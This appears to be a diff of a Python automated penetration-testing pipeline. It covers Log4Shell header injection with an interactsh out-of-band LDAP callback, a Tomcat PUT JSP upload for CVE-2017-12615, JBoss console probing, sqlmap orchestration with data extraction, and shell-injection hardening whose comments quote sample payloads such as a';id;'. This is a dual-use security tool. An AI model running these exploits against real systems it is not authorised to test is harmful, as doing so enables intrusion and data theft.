         ok, out = run_cmd(
             f'{nuclei_bin} -l "{targets_file}" '
             f'-tags tomcat,jboss,log4shell,rce,cve '
@@ -5540,26 +5867,39 @@ def run_rce_scan(domain: str) -> bool:
                 [interactsh_bin, "-json", "-o", interactsh_log],
                 shell=False, capture=True, merge_stderr=True,
             )
-            # Non-blocking readline with a hard deadline so this phase
-            # never deadlocks waiting on an empty pipe.
+            # Read the RAW fd (os.read), NOT a buffered readline(): interactsh prints its banner
+            # and the OOB URL in a single write, so select() (which polls the fd) + readline()
+            # would return the banner and strand the URL inside the TextIOWrapper buffer — the fd
+            # then reads empty, select says not-ready, and the URL is SILENTLY missed. Accumulate
+            # raw bytes and regex-scan the buffer (handles a URL split across reads). Mirrors the
+            # already-correct pattern at hunt.py ~1218.
             import select as _select
+            import re as _re
+            _fd = None
             if interactsh_proc.stdout:
+                try:
+                    _fd = interactsh_proc.stdout.fileno()
+                except Exception:
+                    _fd = None
+            if _fd is not None:
                 deadline = time.time() + 10
-                while time.time() < deadline:
-                    ready, _, _ = _select.select([interactsh_proc.stdout], [], [], 0.5)
+                _buf = b""
+                while time.time() < deadline and not oob_url:
+                    ready, _, _ = _select.select([_fd], [], [], 0.5)
                     if not ready:
                         continue
-                    line = interactsh_proc.stdout.readline()
-                    if not line:
+                    try:
+                        chunk = os.read(_fd, 65536)
+                    except OSError:
                         break
-                    if ".oast." in line or "interact.sh" in line:
-                        # Parse URL from interactsh stdout (it prints the domain)
-                        import re as _re
-                        m = _re.search(r'([a-z0-9]+\.oast\.[a-z]+|[a-z0-9]+\.interact\.sh)', line)
-                        if m:
-                            oob_url = f"ldap://{m.group(1)}"
-                            log("ok", f"interactsh OOB: {oob_url}")
-                            break
+                    if not chunk:
+                        break                              # EOF
+                    _buf += chunk
+                    m = _re.search(rb'([a-z0-9]+\.oast\.[a-z]+|[a-z0-9]+\.interact\.sh)', _buf)
+                    if m:
+                        oob_url = f"ldap://{m.group(1).decode('utf-8', 'replace')}"
+                        log("ok", f"interactsh OOB: {oob_url}")
+                        break
             if not oob_url:
                 log("warn", "interactsh started but no OOB URL appeared within 10s")
         except Exception as e:
@@ -5584,7 +5924,12 @@ def run_rce_scan(domain: str) -> bool:
     log4shell_out = os.path.join(rce_dir, "log4shell.txt")
     log4s_results = [f"# Log4Shell (CVE-2021-44228) — {domain}\n# OOB: {oob_url}\n"]
 
-    for target_url in java_targets[:20]:
+    # audit-fix (finding 8): Log4Shell runs on the Java-confirmed host set, a
+    # bounded list; iterate ALL of it (each curl is ``-m 5`` bounded) instead of
+    # silently dropping hosts past the first 20 on this confirmed-tech path.
+    if len(java_targets) > 20:
+        log("info", f"Log4Shell: probing all {len(java_targets)} Java-confirmed host(s)")
+    for target_url in java_targets:
         for payload in log4shell_variants[:2]:  # 2 variants per host to limit noise
             # Inject in User-Agent, X-Forwarded-For, Referer
             headers = [
@@ -5650,8 +5995,13 @@ def run_rce_scan(domain: str) -> bool:
     tomcat_rce_out = os.path.join(rce_dir, "tomcat_put_rce.txt")
     tomcat_results = [f"# CVE-2017-12615 Tomcat PUT RCE — {domain}\n"]
 
-    # Detect Tomcat targets: any Java target running Tomcat based on Server header or tech tag
+    # Detect Tomcat targets: any Java target running Tomcat based on Server header or tech tag.
+    # audit-fix (finding 8): when Tomcat is CONFIRMED (tomcat_targets), test the
+    # whole confirmed set; only the unconfirmed java fallback keeps a heuristic
+    # ``[:10]`` bound. The downstream loop iterates put_targets in full.
     put_targets = tomcat_targets if tomcat_targets else java_targets[:10]
+    if len(put_targets) > 10:
+        log("info", f"Tomcat PUT RCE: probing {len(put_targets)} confirmed Tomcat host(s)")
 
     jsp_content = """<%@ page import="java.io.*" %>
 <%
@@ -5674,7 +6024,7 @@ catch (Exception e) {
     with open(jsp_payload_path, "w") as jsp_file:
         jsp_file.write(jsp_content)
 
-    for target_url in put_targets[:10]:
+    for target_url in put_targets:
         # Test 1: OPTIONS to see allowed methods
         _, out = run_cmd_args(
             ["curl", "-sk", "-m", "5", "-X", "OPTIONS", "-D-", "-o", "/dev/null", f"{target_url}/"],
@@ -5756,8 +6106,15 @@ exploit
     jboss_results   = [f"# JBoss Admin Console Exposure — {domain}\n"]
 
     # Probe all Java targets (not just detected JBoss — many show JBoss default page
-    # without flagging the tech header)
-    jboss_probe_targets = list(dict.fromkeys(jboss_targets if jboss_targets else java_targets[:10]))[:20]
+    # without flagging the tech header).
+    # audit-fix (finding 8): when JBoss is CONFIRMED (jboss_targets), probe the
+    # full confirmed set; only the unconfirmed java fallback keeps the heuristic
+    # ``[:10]`` bound. The old extra ``[:20]`` cap (here and in the loop) silently
+    # dropped confirmed JBoss hosts — mark a degradation if it would have bitten.
+    if jboss_targets:
+        jboss_probe_targets = list(dict.fromkeys(jboss_targets))
+    else:
+        jboss_probe_targets = list(dict.fromkeys(java_targets[:10]))
 
     jboss_paths = [
         "/jmx-console/",
@@ -5781,7 +6138,7 @@ exploit
         "web application firewall",
     )
 
-    for target_url in jboss_probe_targets[:20]:
+    for target_url in jboss_probe_targets:
         for path in jboss_paths:
             _, out = run_cmd_args(
                 ["curl", "-sk", "-m", "5", "-w", "\n%{http_code}", f"{target_url.rstrip('/')}{path}"],
@@ -6035,6 +6392,45 @@ def run_email_audit(domain: str, *, smtp_probe: bool = False) -> bool:
     return True
 
 
+def _parse_seed_urls(spec: str) -> list:
+    """--seed-urls accepts a FILE (one URL per line) OR a comma-separated list. Returns the
+    distinct http(s) URLs in order."""
+    if not spec:
+        return []
+    if os.path.isfile(spec):
+        with open(spec, errors="ignore") as fh:
+            raw = [ln.strip() for ln in fh]
+    else:
+        raw = [p.strip() for p in spec.split(",")]
+    out, seen = [], set()
+    for u in raw:
+        if u.startswith(("http://", "https://")) and u not in seen:
+            seen.add(u)
+            out.append(u)
+    return out
+
+
+def _seed_urls_into_recon(recon_dir: str, seeds: list) -> int:
+    """Append seed URLs into <recon_dir>/urls/with_params.txt so the sqlmap/param phases (and
+    the authz IDOR enumeration) test them — the fix for WebForms (__doPostBack) apps whose GET
+    endpoints the link-crawl never discovers. Dedups; returns the count newly written."""
+    if not seeds:
+        return 0
+    urls_dir = os.path.join(recon_dir, "urls")
+    os.makedirs(urls_dir, exist_ok=True)
+    wp = os.path.join(urls_dir, "with_params.txt")
+    existing = set()
+    if os.path.isfile(wp):
+        with open(wp, errors="ignore") as fh:
+            existing = {ln.strip() for ln in fh if ln.strip()}
+    new = [u for u in seeds if u not in existing]
+    if new:
+        with open(wp, "a") as fh:
+            for u in new:
+                fh.write(u + "\n")
+    return len(new)
+
+
 # ── NEW: sqlmap targeted scan ───────────────────────────────────────────────────
 def run_sqlmap_targeted(domain: str, cookies: str = "") -> bool:
     """
@@ -6042,6 +6438,9 @@ def run_sqlmap_targeted(domain: str, cookies: str = "") -> bool:
     """
     log("phase", f"SQLMAP: {domain}")
     recon_dir    = _resolve_recon_dir(domain)
+    _n_seeded = _seed_urls_into_recon(recon_dir, _SEED_URLS)
+    if _n_seeded:
+        log("ok", f"--seed-urls: {_n_seeded} URL(s) seeded into the sqli candidate set")
     findings_dir = _resolve_findings_dir(domain, create=True)
     sqli_dir     = os.path.join(findings_dir, "sqlmap")
     os.makedirs(sqli_dir, exist_ok=True)
@@ -6109,7 +6508,14 @@ def run_sqlmap_targeted(domain: str, cookies: str = "") -> bool:
     # v9.24 — seed db-named in-scope live hosts (mssql/mysql/db/postgres/oracle…)
     # as sqlmap candidates. These are the highest-value SQLi surface yet the
     # historical aggregator never included them (no query string → filtered out).
-    candidates.extend(_collect_db_named_candidates(recon_dir))
+    #
+    # audit-fix (finding 1/9): PREPEND db-named candidates so they survive the
+    # ``[:SQLMAP_GET_MAX]`` cap below. Appending them put db-tier hosts last in
+    # insertion order, so on busy targets they were the FIRST to be dropped —
+    # exactly inverting their priority. Seed up to the GET cap (was 10) so a
+    # large db tier isn't bottlenecked at the seed stage either (finding 9).
+    db_named = _collect_db_named_candidates(recon_dir, limit=SQLMAP_GET_MAX)
+    candidates = db_named + candidates
 
     candidates = [c for c in dict.fromkeys(candidates) if not _looks_like_payload_url(c)]
 
@@ -6118,7 +6524,18 @@ def run_sqlmap_targeted(domain: str, cookies: str = "") -> bool:
     # tokens (``?d=FUZZ&t=FUZZ`` → ``?d=1&t=1``) so sqlmap has a real baseline
     # value to mutate instead of fuzzing the literal string "FUZZ".
     candidates = _sanitize_sqlmap_candidates(candidates)
-    candidates = candidates[:20]  # top 20 GET candidates
+
+    # audit-fix (finding 1): cap the GET surface, but mark a degradation if the
+    # cap actually dropped anything — silently testing only the first N hosts
+    # over-reports coverage. db-named hosts are already at the front, so the
+    # drops are the lower-value tail.
+    _total_get = len(candidates)
+    candidates = candidates[:SQLMAP_GET_MAX]  # top GET candidates
+    if _total_get > SQLMAP_GET_MAX:
+        _dropped = _total_get - SQLMAP_GET_MAX
+        log("warn", f"sqlmap GET candidates capped at {SQLMAP_GET_MAX} "
+                    f"({_dropped} of {_total_get} dropped, db-named retained)")
+        _mark_degraded("sqlmap", f"GET candidates capped: tested {SQLMAP_GET_MAX} of {_total_get}")
 
     # v9.24 audit-fix (finding L): remember whether ANY candidate was discovered
     # before reachability filtering, so the "nothing to test" message can tell
@@ -6167,7 +6584,12 @@ def run_sqlmap_targeted(domain: str, cookies: str = "") -> bool:
 
     # v7.1.4 — thread session cookies into sqlmap so authenticated endpoints
     # don't 302 back to the login page before sqlmap can probe them.
-    cookie_opt = f'--cookie="{cookies}"' if cookies else ""
+    # Shell-injection hardening: this flag is interpolated into a /bin/sh -c
+    # string, so shlex.quote the (operator-supplied) cookie value rather than
+    # hand-wrapping in double quotes — a `"`/`$()`/`;` in --cookie would
+    # otherwise break out of the command (or silently corrupt the cookie and
+    # false-negative the SQLi on auth-gated endpoints).
+    cookie_opt = f"--cookie={shlex.quote(cookies)}" if cookies else ""
 
     sqli_out = os.path.join(sqli_dir, "sqlmap_results.txt")
 
@@ -6178,8 +6600,8 @@ def run_sqlmap_targeted(domain: str, cookies: str = "") -> bool:
             f.write("\n".join(candidates))
 
         ok, out = run_cmd(
-            f'sqlmap -m "{cand_file}" --batch --level=3 --risk=2 '
-            f'--output-dir="{sqli_dir}" --results-file="{sqli_out}" '
+            f'sqlmap -m {shlex.quote(cand_file)} --batch --level=3 --risk=2 '
+            f'--output-dir={shlex.quote(sqli_dir)} --results-file={shlex.quote(sqli_out)} '
             f'--random-agent --timeout=10 {cookie_opt}',
             timeout=1800,
             watch_file=sqli_dir,
@@ -6227,12 +6649,19 @@ def run_sqlmap_targeted(domain: str, cookies: str = "") -> bool:
         is_json_body = body.startswith("{") or body.startswith("[")
         json_header = ' --headers="Content-Type: application/json"' if is_json_body else ''
 
+        # Shell-injection hardening (audit-fix): op["url"] comes from the
+        # target-served OpenAPI/Swagger spec and `body` = json.dumps(...) whose
+        # KEYS are raw spec property names. json.dumps does NOT escape single
+        # quotes, so a property name like  a';id;'  would break out of the old
+        # --data='...' clause and run on the operator host. shlex.quote every
+        # interpolated value, matching the request-file sibling at _build().
+        # json_header is a static literal (Content-Type only) so it stays raw.
         ok_p, out_p = run_cmd(
-            f'sqlmap -u "{op["url"]}" --data=\'{body}\' '
-            f'--method {op["method"]} --batch --level=3 --risk=2 '
+            f'sqlmap -u {shlex.quote(op["url"])} --data={shlex.quote(body)} '
+            f'--method {shlex.quote(op["method"])} --batch --level=3 --risk=2 '
             f'--technique=BEU --smart '
             f'--random-agent --timeout=10 {cookie_opt}{json_header} '
-            f'--output-dir="{sqli_dir}"',
+            f'--output-dir={shlex.quote(sqli_dir)}',
             timeout=600,
         )
         post_attempted = True
@@ -6256,8 +6685,11 @@ def run_sqlmap_targeted(domain: str, cookies: str = "") -> bool:
 
     injections = 0
     if os.path.exists(sqli_out):
-        injections = sum(1 for line in open(sqli_out)
-                         if "injectable" in line.lower() or "injection" in line.lower())
+        # audit-fix (finding 10): use a context manager so the fd is closed
+        # promptly rather than leaked until GC.
+        with open(sqli_out) as _sf:
+            injections = sum(1 for line in _sf
+                             if "injectable" in line.lower() or "injection" in line.lower())
         if injections:
             log("crit", f"sqlmap: {injections} injectable parameter(s) found → {sqli_dir}")
             injectable_found = True
@@ -6354,6 +6786,18 @@ def _parse_sqlmap_confirmation(out: str) -> dict:
             m = _re.match(r"\|\s*([A-Za-z0-9_]+)\s*\|$", ln.strip())
             if m and m.group(1).lower() not in ("table", "tables"):
                 res["tables"].append(m.group(1))
+
+    # ANTI-FABRICATION veto: sqlmap's explicit not-injectable / false-positive verdict
+    # overrides any heuristic confirmation. The "the back-end dbms is X" line (and a transient
+    # "appears to be ... injectable") is printed DURING false-positive fingerprinting, so it
+    # must not stand once sqlmap rejects the point. A REAL confirmation always carries a
+    # structured "Parameter:"/"Type:" block; absent that, honour the rejection.
+    _NEG = ("false positive or unexploitable injection point",
+            "does not seem to be injectable",
+            "do not appear to be injectable",
+            "all tested parameters do not appear")
+    if any(n in low for n in _NEG) and not res["params"] and not res["types"]:
+        res["confirmed"] = False
 
     for k in ("params", "types", "payloads", "tables"):
         res[k] = list(dict.fromkeys(res[k]))
@@ -6466,12 +6910,22 @@ def _parse_sqlmap_sql_query_rows(out: str) -> list[str]:
     if not out:
         return []
     rows = []
-    skip = ("starting @ ", "ending @ ", "shutting down at ")
+    # sqlmap banner lines always carry a wall-clock time, e.g.
+    #   ``[*] starting @ 14:03:22 /2026-06-20/``
+    #   ``[*] shutting down at 14:05:01``
+    # audit-fix (finding 10): anchor the banner skip to that trailing HH:MM[:SS]
+    # so a legitimately-retrieved value that merely begins with one of these
+    # words (e.g. ``shutting down at user request``) is NOT mistaken for a banner
+    # and dropped.
+    _banner_re = re.compile(
+        r'^(?:starting @|ending @|shutting down at)\s.*\b\d{1,2}:\d{2}(?::\d{2})?\b',
+        re.IGNORECASE,
+    )
     for ln in out.splitlines():
         s = ln.strip()
         if s.startswith("[*] "):
             val = s[4:].strip()
-            if val and not val.lower().startswith(skip):
+            if val and not _banner_re.match(val):
                 rows.append(val)
     return rows
 
@@ -6554,6 +7008,23 @@ def _sqlmap_targeted_extract(req_abs: str, sqli_dir: str, schema: str, table: st
 
 
 # ── NEW: sqlmap via raw request file (--request-file) ───────────────────────────
+def _sqlmap_eval_crashed(out: str) -> bool:
+    """True if sqlmap's --eval (the WebForms VIEWSTATE/EventValidation refresh) crashed, so
+    the run NEVER actually tested the parameter — it must NOT be reported as a clean negative.
+
+    Seen live: a form param value that is a Python-invalid literal (e.g. a leading-zero date
+    like 01/01/2020) makes sqlmap's --eval raise 'SyntaxError: invalid decimal literal', sqlmap
+    aborts after ~1s, and the wrapper would otherwise log 'complete — no injection confirmed'
+    (a silent false-negative). Anti-fabrication: an aborted run is INCONCLUSIVE, not negative.
+    """
+    return "evaluating provided code" in (out or "").lower()
+
+
+def _sqlmap_eval_crash_reason(out: str) -> str:
+    m = re.search(r"evaluating provided code \('([^']+)'\)", out or "")
+    return m.group(1) if m else "eval error"
+
+
 def run_sqlmap_request_file(req_file: str, domain: str | None = None,
                              level: int = 5, risk: int = 3,
                              extra_flags: str = "",
@@ -6600,7 +7071,9 @@ def run_sqlmap_request_file(req_file: str, domain: str | None = None,
                 path_from_file   = parts[1]
         for ln in lines[1:]:
             if ln.lower().startswith("host:"):
-                host_from_file = host_from_file or ln.split(":", 1)[1].strip().split(":")[0]
+                _h = ln.split(":", 1)[1].strip().split(":")[0]
+                _h = _re.sub(r'[^A-Za-z0-9.-]', '', _h)   # hostname charset only — a poisoned
+                host_from_file = host_from_file or _h     # Host header must not traverse the output path
             if not ln.strip() and not has_post_body:
                 # blank line = end of headers; body may follow
                 has_post_body = (method_from_file in ("POST", "PUT", "PATCH"))
@@ -6609,6 +7082,78 @@ def run_sqlmap_request_file(req_file: str, domain: str | None = None,
 
     effective_domain = domain or host_from_file or "unknown"
     log("info", f"Target: {effective_domain}  {method_from_file} {path_from_file}")
+
+    # ── ASP.NET WebForms support (gap fix) ───────────────────────────────────
+    # __VIEWSTATE / __EVENTVALIDATION / __VIEWSTATEGENERATOR are server-VALIDATED on
+    # every postback; the stale copies in a captured request file are rejected BEFORE
+    # the query runs, so sqlmap silently tests nothing and reports a false negative.
+    # sqlmap's --eval runs Python before EACH request with the POST params as variables;
+    # re-fetch the form URL and reassign all three so every mutated request carries
+    # fresh, valid tokens. (Found on a real IIS/WebForms login; tokens here are not
+    # session-bound — for ViewStateUserKey-bound apps a cookie-sharing variant is needed.)
+    webforms_eval = ""
+    _body = ""
+    if "\r\n\r\n" in raw:
+        _body = raw.split("\r\n\r\n", 1)[1]
+    elif "\n\n" in raw:
+        _body = raw.split("\n\n", 1)[1]
+    # Treat as WebForms only when __VIEWSTATE is an actual POST-BODY param (not a substring
+    # in a header/comment), and we know the host.
+    if "__VIEWSTATE=" in (_body or "") and host_from_file:
+        # Form URL: honour an absolute-form request line; else scheme + host + path
+        # (https unless the Host header pins :80).
+        if path_from_file.lower().startswith(("http://", "https://")):
+            _form_url = path_from_file
+        else:
+            _scheme = "http" if host_from_file.endswith(":80") else "https"
+            _form_url = f"{_scheme}://{host_from_file}{path_from_file}"
+        # Forward the captured session cookies so session-bound tokens still validate.
+        _cookie_hdr = ""
+        for _ln in raw.split("\n"):
+            if _ln.lower().startswith("cookie:"):
+                _cookie_hdr = _ln.split(":", 1)[1].strip()
+                break
+        _tok_re = lambda n, html: (lambda m: m.group(1) if m else None)(
+            _re.search('"' + n + '"[^>]*value="([^"]*)"', html))
+        # PRE-FLIGHT (fail-closed): confirm all three tokens are actually extractable from a
+        # fresh fetch. If not, do NOT enable the refresh — a scan with stale/empty tokens
+        # would scan rejected postbacks and FALSE-NEGATIVE (the very bug this fixes).
+        _wf_ok = False
+        try:
+            import requests as _rqf
+            try:
+                _rqf.packages.urllib3.disable_warnings()
+            except Exception:
+                pass
+            _pf = _rqf.get(_form_url, verify=False, timeout=15,
+                           headers={"User-Agent": "Mozilla/5.0", "Cookie": _cookie_hdr}).text
+            _wf_ok = all(_tok_re(n, _pf) for n in
+                         ("__VIEWSTATE", "__EVENTVALIDATION", "__VIEWSTATEGENERATOR"))
+        except Exception:
+            _wf_ok = False
+        if not _wf_ok:
+            log("warn", f"ASP.NET WebForms detected but token pre-flight FAILED ({_form_url}) "
+                        "— NOT enabling auto-refresh (a stale-token scan would false-negative). "
+                        "Verify the form URL / session binding manually.")
+        else:
+            # json.dumps makes the URL + cookie SAFE Python string literals — a quote/backslash
+            # in the request-file path can no longer break out and execute code in sqlmap's
+            # --eval on the OPERATOR BOX (codex+grok: critical RCE in the first cut). Stdlib
+            # urllib so the eval runs even where sqlmap's python lacks `requests`.
+            _ec = (
+                "import urllib.request as _U,re as _R,ssl as _SS; "
+                "_cx=_SS.create_default_context(); _cx.check_hostname=False; _cx.verify_mode=_SS.CERT_NONE; "
+                f"_rq=_U.Request({json.dumps(_form_url)},headers={{'User-Agent':'Mozilla/5.0','Cookie':{json.dumps(_cookie_hdr)}}}); "
+                "_vsT=_U.urlopen(_rq,timeout=15,context=_cx).read().decode('utf-8','replace'); "
+                "_g=lambda n:(lambda m:m.group(1) if m else None)(_R.search('\"'+n+'\"[^>]*value=\"([^\"]*)\"',_vsT)); "
+                "__VIEWSTATE=_g('__VIEWSTATE') or __VIEWSTATE; "
+                "__EVENTVALIDATION=_g('__EVENTVALIDATION') or __EVENTVALIDATION; "
+                "__VIEWSTATEGENERATOR=_g('__VIEWSTATEGENERATOR') or __VIEWSTATEGENERATOR"
+            )
+            import shlex as _shlex0
+            webforms_eval = " --eval=" + _shlex0.quote(_ec)
+            log("ok", f"ASP.NET WebForms detected ({_form_url}) — auto-refreshing "
+                      "VIEWSTATE/EventValidation per request (token pre-flight OK)")
 
     if not _which("sqlmap"):
         log("warn", "sqlmap not installed — brew install sqlmap")
@@ -6631,18 +7176,34 @@ def run_sqlmap_request_file(req_file: str, domain: str | None = None,
     # requests it needs (heavy re-enumeration every call is what trips edge rate-limiting /
     # 421 Misdirected Request storms on protected targets).
     enum_clause = '' if lean else '--dbs --tables '
+    # Shell-injection hardening: this string runs via /bin/sh -c, and req_abs / sqli_dir / sqli_out
+    # derive from the request-file path and its (attacker-controllable) Host header, while `tamper`
+    # comes from --sqlmap-tamper. shlex.quote every interpolated value (the sibling
+    # _sqlmap_targeted_extract already does). extra_flags/extra stay operator-supplied (raw flags).
+    import shlex as _shlex
+    _q_req, _q_dir, _q_out = _shlex.quote(req_abs), _shlex.quote(sqli_dir), _shlex.quote(sqli_out)
+    # extra_flags is operator-supplied (--sqlmap-extra); `extra` is hard-coded.
+    # Tokenize + re-quote each flag so the latent sink can never become a shell
+    # injection regardless of future callers (e.g. if brain/LLM/scanner output
+    # is ever wired into extra_flags). shlex.split preserves distinct argv
+    # tokens (--dump, -D, --sql-query …); shlex.quote defangs metacharacters.
+    def _quote_flags(*raw: str) -> str:
+        toks = []
+        for r in raw:
+            toks.extend(_shlex.split(r or ""))
+        return " ".join(_shlex.quote(t) for t in toks)
     def _build(tamper_clause: str, extra: str = "") -> str:
         return (
-            f'sqlmap -r "{req_abs}" '
+            f'sqlmap -r {_q_req} '
             f'--batch --level={level} --risk={risk} '
             f'{enum_clause}--random-agent {tamper_clause}'
-            f'--output-dir="{sqli_dir}" --results-file="{sqli_out}" '
+            f'--output-dir={_q_dir} --results-file={_q_out} '
             f'--timeout=15 --retries=2 '
-            f'{extra_flags} {extra}'
+            f'{_quote_flags(extra_flags, extra)}'
         ).strip()
 
-    tamper_clause = f'--tamper={tamper} ' if tamper else ''
-    cmd = _build(tamper_clause)
+    tamper_clause = f'--tamper={_shlex.quote(tamper)} ' if tamper else ''
+    cmd = _build(tamper_clause) + webforms_eval
 
     log("info", f"Running: {cmd}")
     # pty_stdin=True is REQUIRED here: sqlmap's `-r` (request-file) mode silently
@@ -6666,7 +7227,7 @@ def run_sqlmap_request_file(req_file: str, domain: str | None = None,
         log("warn", "Dump extraction failed with tampers active (blank/errored) — "
                     "retrying WITHOUT tampers (--fresh-queries); tampers can corrupt "
                     "the heavier data-extraction payloads")
-        cmd2 = _build('', '--fresh-queries')
+        cmd2 = _build('', '--fresh-queries') + webforms_eval
         log("info", f"Running: {cmd2}")
         ok2, out2 = run_cmd(cmd2, timeout=2400, watch_file=sqli_dir,
                             watch_phase="SQLMAP-RF-NOTAMPER", pty_stdin=True)
@@ -6713,9 +7274,18 @@ def run_sqlmap_request_file(req_file: str, domain: str | None = None,
     conf = _parse_sqlmap_confirmation(out)
     # results.txt CSV is an extra signal on a fresh (non-resumed) run.
     if os.path.isfile(sqli_out):
-        for ln in open(sqli_out):
-            if "injectable" in ln.lower() or "injection point" in ln.lower():
-                conf["confirmed"] = True
+        # audit-fix (finding 10): context-managed read (was a leaked fd).
+        with open(sqli_out) as _sf:
+            for ln in _sf:
+                low_ln = ln.lower()
+                # ANTI-FABRICATION: "injection point" also matches "false positive or
+                # unexploitable injection point detected"; "injectable" matches "not
+                # injectable". Only a POSITIVE row may confirm — exclude the rejections.
+                if (("injectable" in low_ln or "injection point" in low_ln)
+                        and "false positive" not in low_ln and "unexploitable" not in low_ln
+                        and "not injectable" not in low_ln and "does not seem" not in low_ln
+                        and "do not appear" not in low_ln):
+                    conf["confirmed"] = True
 
     target_url = path_from_file if path_from_file.lower().startswith("http") \
         else f"https://{effective_domain}{path_from_file}"
@@ -6747,6 +7317,18 @@ def run_sqlmap_request_file(req_file: str, domain: str | None = None,
                 sf.write(f"ENUMERATED TABLES ({len(conf['tables'])}):\n"
                          + "\n".join(conf["tables"]) + "\n")
         log("crit", f"Summary → {summary_f}")
+    elif _sqlmap_eval_crashed(out):
+        # The --eval (WebForms token refresh) crashed → the parameter was NEVER tested.
+        # Report INCONCLUSIVE, not a clean negative (anti-fabrication / false-negative guard).
+        log("warn", f"sqlmap (request-file) INCONCLUSIVE — the WebForms --eval token refresh "
+                    f"CRASHED ({_sqlmap_eval_crash_reason(out)}); the scan did NOT actually test "
+                    f"the parameter, so this is NOT a clean negative. Re-test (e.g. avoid a "
+                    f"Python-invalid param value such as a leading-zero date like 01/01/2020). → {sqli_dir}")
+        try:
+            _mark_degraded("sqlmap_rf", "WebForms --eval crashed; request-file SQLi coverage is "
+                           "UNRELIABLE for this target — do NOT read 'no injection' as a clean result")
+        except Exception:
+            pass
     else:
         log("ok", f"sqlmap (request-file) complete — no injection confirmed → {sqli_dir}")
 
@@ -6971,11 +7553,14 @@ def run_post_param_discovery(domain: str,
         with open(targets_file, "w") as tf:
             tf.write("\n".join(arjun_targets))
 
-        cookie_flag = f'--headers "Cookie: {cookies}"' if cookies else ""
+        # Shell-injection hardening: shlex.quote the operator-supplied cookie
+        # value (interpolated into a /bin/sh -c string below). A `"`/`$()`/`;`
+        # in --cookie would otherwise break out of the command.
+        cookie_flag = f"--headers {shlex.quote('Cookie: ' + cookies)}" if cookies else ""
         ok_arjun, out_arjun = run_cmd(
-            f'arjun -i "{targets_file}" --method POST --stable '
+            f'arjun -i {shlex.quote(targets_file)} --method POST --stable '
             f'--rate-limit 5 -t 5 {cookie_flag} '
-            f'-oJ "{arjun_post_out}"',
+            f'-oJ {shlex.quote(arjun_post_out)}',
             timeout=600,
         )
         if os.path.isfile(arjun_post_out):
@@ -7031,25 +7616,50 @@ def run_post_param_discovery(domain: str,
         log("info", f"  POST {url}  params=[{params_preview}]")
 
     # ── Step 3: sqlmap --data on POST candidates ──────────────────────────────
+    post_tested = 0
+    post_skipped = 0
     if _which("sqlmap") and post_params:
         findings_dir  = _resolve_findings_dir(domain, create=True)
         sqli_post_dir = os.path.join(findings_dir, "sqlmap_post")
         os.makedirs(sqli_post_dir, exist_ok=True)
-        cookie_opt = f'--cookie="{cookies}"' if cookies else ""
+        # Shell-injection hardening: shlex.quote the operator-supplied cookie
+        # (interpolated into a /bin/sh -c string below).
+        cookie_opt = f"--cookie={shlex.quote(cookies)}" if cookies else ""
+
+        # audit-fix (finding 2): iterate ALL discovered POST endpoints. The
+        # per-call ``--timeout=10`` + run_cmd timeout already bound total runtime,
+        # so the old ``[:10]`` insertion-order cap only served to silently drop
+        # endpoints (and over-report coverage). SQLMAP_POST_MAX==0 means no cap;
+        # if a positive cap is ever reintroduced, the skipped count is surfaced
+        # in _brain_phase_complete below.
+        post_items = list(post_params.items())
+        if SQLMAP_POST_MAX and len(post_items) > SQLMAP_POST_MAX:
+            post_skipped = len(post_items) - SQLMAP_POST_MAX
+            post_items = post_items[:SQLMAP_POST_MAX]
+            log("warn", f"sqlmap POST endpoints capped at {SQLMAP_POST_MAX} "
+                        f"({post_skipped} skipped)")
+            _mark_degraded("sqlmap", f"POST endpoints capped: tested {SQLMAP_POST_MAX} of {len(post_params)}")
+        post_tested = len(post_items)
 
         injectable_count = 0
-        for url, info in list(post_params.items())[:10]:  # top 10 endpoints
+        for url, info in post_items:
             params_str = "&".join(f"{p}=1" for p in info["params"][:8])
             safe_name  = (url.replace("https://", "").replace("http://", "")
                              .replace("/", "_").replace(":", "_"))[:60]
             out_file   = os.path.join(sqli_post_dir, f"{safe_name}.txt")
 
             log("info", f"sqlmap POST → {url}  data={params_str[:80]}")
+            # Shell-injection hardening (audit-fix): `url` is a target-served
+            # HTML form action and `params_str` is built from raw <input> name
+            # attributes / arjun-discovered param names — both attacker-
+            # controlled. A param named  x";id #  or an action with $(...) would
+            # break out of the old double-quoted clause. shlex.quote every
+            # interpolated value, matching the request-file sibling.
             ok2, out2 = run_cmd(
-                f'sqlmap -u "{url}" --data="{params_str}" '
+                f'sqlmap -u {shlex.quote(url)} --data={shlex.quote(params_str)} '
                 f'--method POST --batch --level=3 --risk=2 '
                 f'--random-agent --timeout=10 {cookie_opt} '
-                f'--output-dir="{sqli_post_dir}" -o "{out_file}"',
+                f'--output-dir={shlex.quote(sqli_post_dir)} -o {shlex.quote(out_file)}',
                 timeout=600,
             )
             if "injectable" in out2.lower() or "injection" in out2.lower():
@@ -7069,7 +7679,8 @@ def run_post_param_discovery(domain: str,
         True,
         detail=(f"target={domain} engine={engine_label} "
                 f"forms={total_forms} post_endpoints={len(post_params)} "
-                f"post_urls={len(post_urls)}"),
+                f"post_urls={len(post_urls)} "
+                f"sqlmap_tested={post_tested} sqlmap_skipped={post_skipped}"),
         artifacts={"post_params": post_params_file, "lp_forms": lp_forms_file},
     )
     return True
@@ -7192,8 +7803,118 @@ def run_jwt_audit(domain: str) -> bool:
 
 
 # ── Existing pipeline ──────────────────────────────────────────────────────────
+# Query-param name suffixes that look like an object identifier worth enumerating for IDOR
+# (the value must also be a positive integer). Matches id, recordId, ClientID, feeRecordId,
+# pageNo, refCode, etc.
+_AUTHZ_ID_SUFFIX = ("id", "key", "no", "num", "ref", "code")
+
+
+def _authz_recon_dir(domain: str, findings_dir: str) -> str:
+    """Map a findings dir back to its sibling recon session dir (separate trees:
+    findings/<domain>/sessions/<id> vs recon/<domain>/sessions/<id>)."""
+    sid = os.path.basename(os.path.normpath(findings_dir))
+    if sid and sid != domain and sid != "findings":
+        return _recon_session_dir(domain, sid)
+    return _recon_domain_root(domain)
+
+
+def _authz_select_pages(all_urls_file: str, base_host: str, limit: int = 40) -> list[str]:
+    """Distinct same-host PATHS from the crawl (urls/all.txt) to PII-scan. Pure file read."""
+    out: list[str] = []
+    seen: set[str] = set()
+    for u in _collect_urls_from_file(all_urls_file, strip_query=True, limit=4000,
+                                     filter_payloads=True):
+        parsed = urlsplit(u)
+        if base_host and parsed.netloc != base_host:
+            continue
+        path = parsed.path or "/"
+        if path in seen:
+            continue
+        seen.add(path)
+        out.append(path)
+        if len(out) >= limit:
+            break
+    return out
+
+
+def _authz_select_object_refs(params_file: str, base_host: str, per_param: int = 12,
+                              max_groups: int = 6) -> list[str]:
